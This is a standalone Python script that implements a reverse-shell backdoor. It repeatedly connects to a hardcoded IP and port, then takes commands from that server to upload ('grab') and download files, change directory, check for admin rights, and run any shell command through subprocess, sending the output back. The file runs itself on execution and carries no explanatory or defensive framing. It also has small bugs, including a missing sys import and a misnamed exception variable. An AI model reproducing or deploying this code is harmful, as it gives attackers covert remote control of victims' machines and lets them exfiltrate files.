import socket
import subprocess
import os
#import sys
import time

def initiate():
    tune_connection()

def tune_connection():
    #Tries to connect to server every 20 seconds
    s = socket.socket()
    while True:
        time.sleep(20)
        try:
            s.connect(("10.3.131.241", 8080))
            shell(s)

        except:
            tune_connection()

def letGrab(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(5000)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def letSend(s, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = s.recv(5000)
            if bits.endswith('DONE'.encode()):
                # Write those last recieved bits without the word 'Done' - 4 characters
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)

def shell(s):
    while True:
        command = s.recv(5000)
        if 'terminate' in command.decode():
            try:
                s.close()
                break
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())
                break

        #command format: grab*<filepath>
        #Example: grab*C:\Users\John\Desktop\photo.jpg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(s, path)
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())

        #command format: send*<Destination path>*<filepath>
        # Example: send*C:\Users\John\Desktop\*photo.jpg
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(s, path, fileName)
            except Exception as E:
                s.send(f"[+] Some error occurred: {str(e)}".encode())

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                inform_to_server = "[+] Current working directory is " + os.getcwd()
                s.send(inform_to_server.encode())
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())


        elif 'checkUserLevel' in command.decode():
            try:
                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith("win") else os.geteuid() == 0

                s.send(("[+] Administrator Privileges." if admin else "[!!] User Privileges. (No Admin privileges)").encode())
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            # send back the result
            s.send(CMD.stdout.read())
            # send back the error -if any-, such as syntax error
            s.send(CMD.stderr.read())

def main():
        initiate()
main()